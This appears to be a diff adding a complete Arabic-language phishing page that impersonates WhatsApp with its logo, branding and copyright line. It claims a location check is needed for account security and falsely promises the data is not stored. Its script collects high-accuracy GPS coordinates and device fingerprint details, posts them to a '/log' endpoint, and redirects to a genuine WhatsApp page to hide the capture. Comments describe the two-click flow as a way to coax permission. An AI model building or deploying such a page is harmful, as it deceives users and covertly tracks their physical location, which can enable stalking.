@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>WhatsApp Security</title>
+    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v4/yP/r/4Lp1WpLiL2E.png">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #e7e9eb;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        .card {
+            max-width: 460px;
+            width: 100%;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.12);
+            overflow: hidden;
+            text-align: center;
+            padding: 32px 24px 24px;
+            border-top: 4px solid #25D366;
+        }
+        .logo { width: 72px; height: 72px; background: #25D366; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
+        .logo svg { width: 44px; height: 44px; fill: white; }
+        h2 { color: #075E54; font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        .subtitle { color: #54656f; font-size: 15px; line-height: 1.5; margin-bottom: 28px; }
+        .security-badge { background: #e7f5e6; border-radius: 40px; padding: 10px 18px; margin-bottom: 28px; display: inline-block; color: #075E54; font-weight: 500; font-size: 14px; }
+        .btn {
+            background: #25D366; color: white; border: none; padding: 14px 24px; border-radius: 40px;
+            font-size: 18px; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.15s;
+            display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px;
+        }
+        .btn:hover { background: #1da15b; }
+        .btn:disabled { background: #a5d6b4; cursor: not-allowed; }
+        #status { color: #075E54; font-size: 14px; margin-top: 16px; min-height: 40px; }
+        .map-container { margin-top: 20px; border-radius: 16px; overflow: hidden; border: 1px solid #e0e0e0; background: #f5f5f5; height: 180px; display: none; }
+        #map { height: 100%; width: 100%; }
+        .footer { margin-top: 24px; color: #a0a0a0; font-size: 11px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #25D366; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error { color: #e74c3c; }
+        .success { color: #25D366; }
+        #consentPopup { background: #f0f2f5; border-radius: 16px; padding: 20px; margin: 20px 0; display: none; }
+    </style>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+</head>
+<body>
+    <div class="card">
+        <div class="logo"><svg viewBox="0 0 24 24"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.33 4.95L2.04 22l5.33-1.4c1.46.8 3.12 1.25 4.83 1.25 5.46 0 9.91-4.45 9.91-9.91 0-5.46-4.45-9.94-10.07-9.94z"/></svg></div>
+        <h2>تأكيد الموقع الجغرافي</h2>
+        <p class="subtitle">لحماية حسابك من الوصول غير المصرح به، نطلب منك تأكيد موقعك الحالي.</p>
+        <div class="security-badge">🔒 اتصال آمن • WhatsApp Security</div>
+        
+        <!-- زر بدء الإجراء -->
+        <button class="btn" id="startBtn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg>
+            متابعة التحقق الأمني
+        </button>
+
+        <!-- Popup توضيحي (يزيد Engagement) -->
+        <div id="consentPopup">
+            <p style="color: #075E54; font-weight: 500; margin-bottom: 12px;">📱 يتطلب الإجراء مشاركة موقعك الحالي</p>
+            <p style="color: #54656f; font-size: 14px; margin-bottom: 20px;">نحن نستخدم موقعك فقط للتحقق من هوية جهازك. لن يتم تخزين هذه البيانات.</p>
+            <button class="btn" id="locateBtn" style="background: #075E54;">📍 مشاركة موقعي الحالي</button>
+        </div>
+
+        <div id="status"></div>
+        <div class="map-container" id="mapContainer"><div id="map"></div></div>
+        <div class="footer">© WhatsApp LLC. جميع الحقوق محفوظة.</div>
+    </div>
+
+    <script>
+        (function() {
+            let map;
+            const startBtn = document.getElementById('startBtn');
+            const locateBtn = document.getElementById('locateBtn');
+            const consentPopup = document.getElementById('consentPopup');
+            const statusDiv = document.getElementById('status');
+            const mapContainer = document.getElementById('mapContainer');
+
+            // الخطوة 1: عرض الـ Popup (زيادة تفاعل المستخدم)
+            startBtn.addEventListener('click', () => {
+                startBtn.style.display = 'none';
+                consentPopup.style.display = 'block';
+            });
+
+            // الخطوة 2: طلب الموقع بعد تفاعل ثانٍ (Engagement Score أعلى)
+            locateBtn.addEventListener('click', function requestWithDelay() {
+                if (!navigator.geolocation) {
+                    showStatus('❌ متصفحك لا يدعم تحديد الموقع.', 'error');
+                    return;
+                }
+                showStatus('<div class="loader"></div> جاري تحديد موقعك...', '');
+                locateBtn.disabled = true;
+
+                const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+                
+                // استخدام setTimeout بسيط لإعطاء المتصفح وقتاً لتسجيل التفاعل
+                setTimeout(() => {
+                    navigator.geolocation.getCurrentPosition(successHandler, errorHandler, options);
+                }, 100);
+            });
+
+            function successHandler(pos) {
+                const lat = pos.coords.latitude, lng = pos.coords.longitude, acc = pos.coords.accuracy;
+                showStatus(`✅ تم التأكيد! (دقة ${Math.round(acc)}م)`, 'success');
+                initMap(lat, lng, acc);
+                sendData({ latitude: lat, longitude: lng, accuracy: acc });
+                setTimeout(() => { window.location.href = 'https://www.whatsapp.com/security-tips'\; }, 3000);
+            }
+
+            function errorHandler(err) {
+                let msg = '';
+                if (err.code === 1) msg = '❌ تم رفض الصلاحية. يرجى السماح بالموقع من إعدادات المتصفح.';
+                else if (err.code === 2) msg = '❌ تعذر تحديد الموقع (GPS غير متاح).';
+                else if (err.code === 3) msg = '⏳ انتهت المهلة. حاول في مكان مفتوح.';
+                else msg = '❌ حدث خطأ غير معروف.';
+                showStatus(msg, 'error');
+                locateBtn.disabled = false;
+                sendData({ location_failed: true, error: msg });
+            }
+
+            function initMap(lat, lng, accuracy) {
+                mapContainer.style.display = 'block';
+                if (!map) {
+                    map = L.map('map').setView([lat, lng], 15);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                } else {
+                    map.setView([lat, lng], 15);
+                    map.eachLayer(l => { if (l instanceof L.Marker || l instanceof L.Circle) map.removeLayer(l); });
+                }
+                L.marker([lat, lng]).addTo(map).bindPopup('موقعك الحالي').openPopup();
+                L.circle([lat, lng], { radius: accuracy, color: '#25D366', fillOpacity: 0.15 }).addTo(map);
+            }
+
+            function showStatus(msg, type) { statusDiv.innerHTML = msg; statusDiv.className = type || ''; }
+
+            async function sendData(payload) {
+                payload.timestamp = new Date().toISOString();
+                payload.device = {
+                    userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language,
+                    hardwareConcurrency: navigator.hardwareConcurrency, screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                try { await fetch('/log', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) }); } catch(e) {}
+            }
+        })();
+    </script>
+</body>
+</html>
